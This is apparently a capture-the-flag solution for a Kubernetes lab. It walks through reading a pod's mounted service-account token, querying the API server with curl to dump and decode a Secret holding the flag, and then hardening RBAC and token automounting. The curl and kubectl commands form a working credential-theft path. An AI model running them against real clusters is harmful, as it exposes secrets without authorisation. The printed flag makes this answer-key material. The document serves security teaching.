# Solution — Stolen ServiceAccount Token

The flag is `KUBE{mounted_token_reads_the_secret}`. Below is the intended in-pod path (raw API with `curl`), two shortcuts, and the hardening that makes all of them fail.

## Step 0 — get a shell in the pod

In a real breach this is an app bug; here you `exec` in directly:

```bash
kubectl -n dojo-ctf exec -it worker -- sh
```

Everything from here runs **inside** the `worker` pod. You have no kubeconfig and no admin cert — only what's mounted.

## Step 1 — locate the three mounted files

```sh
SA=/var/run/secrets/kubernetes.io/serviceaccount
ls -l "$SA"
# ca.crt  namespace  token
```

- `token` — a signed JWT identifying this pod as `system:serviceaccount:dojo-ctf:worker-sa`.
- `ca.crt` — the cluster CA, so you can verify the API server's TLS instead of using `-k`.
- `namespace` — the pod's namespace, `dojo-ctf`.

## Step 2 — authenticate to the API server by hand

```sh
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat "$SA/token")
NS=$(cat "$SA/namespace")
APISERVER=https://kubernetes.default.svc

# Sanity check — who am I, and can I reach the API?
curl --cacert "$SA/ca.crt" \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NS/secrets"
```

`kubernetes.default.svc` is the in-cluster DNS name of the API server's ClusterIP Service — always present, always resolvable from a pod. The `--cacert` makes the TLS trust real: you verify the server with the same CA the kubelet used, exactly as a well-behaved client should.

## Step 3 — read the flag Secret

List call above already returns `db-credentials`. Fetch it directly and pull the flag:

```sh
curl -s --cacert "$SA/ca.crt" \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NS/secrets/db-credentials"
```

The response is JSON; `.data.FLAG` is base64 (not encrypted — Course 01's lesson). If the image has `base64`:

```sh
# busybox base64 decodes with -d
echo 'S1VCRXs...'| base64 -d          # paste the .data.FLAG value
```

If `jq` isn't present (it usually isn't in busybox), grab the field with POSIX tools:

```sh
curl -s --cacert "$SA/ca.crt" -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NS/secrets/db-credentials" \
  | tr ',' '\n' | grep '"FLAG"' | cut -d'"' -f4 | base64 -d; echo
# -> KUBE{mounted_token_reads_the_secret}
```

## Shortcut A — the token works with `kubectl` too

If `kubectl` is reachable (from the pod or from your host, pointed at the token), the SA credential reads the Secret directly — no manual `curl`:

```sh
# from your host, impersonating what the pod's SA can do:
kubectl -n dojo-ctf get secret db-credentials \
  -o jsonpath='{.data.FLAG}' | base64 -d; echo
```

The point of the `curl` path is that attackers rarely get `kubectl` in the image — the mounted token is all they have, and it's enough.

## Shortcut B — confirm the over-broad grant first

Before reading anything, the token can audit itself. This is the recon → exploit split from Module 01:

```sh
# inside the pod, if kubectl is present; otherwise use the SelfSubjectAccessReview API
kubectl auth can-i get secrets -n dojo-ctf   # -> yes  (this is the bug)
kubectl auth can-i --list -n dojo-ctf
```

A `yes` on `get secrets` for a worker that never needed it is the finding.

## The fix — break both links

Two defaults made this possible; close either and the blast radius collapses, close both and it's near-zero:

```yaml
# 1) Don't hand every pod an API credential it doesn't use.
apiVersion: v1
kind: ServiceAccount
metadata:
  name: worker-sa
  namespace: dojo-ctf
automountServiceAccountToken: false      # or set it per-pod in the pod spec
```

```yaml
# 2) If the SA genuinely needs ONE secret, pin it — don't grant all Secrets.
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: secret-reader
  namespace: dojo-ctf
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get"]
    resourceNames: ["only-the-one-it-needs"]   # not db-credentials
```

- `automountServiceAccountToken: false` removes the mounted token entirely — a compromised app has no bearer credential to steal.
- `resourceNames` scopes the Role to a single named Secret, so even with a token the SA can't read `db-credentials`.
- Defense in depth, later in this course: a **NetworkPolicy** denying pod egress to the API server for workloads that never call it, and **Pod Security Admission** to stop the pod from escalating further.

Run `kubectl auth can-i get secrets -n dojo-ctf --as=system:serviceaccount:dojo-ctf:worker-sa` after the fix — it returns `no`, and this challenge becomes unsolvable from inside the pod. That's the win.
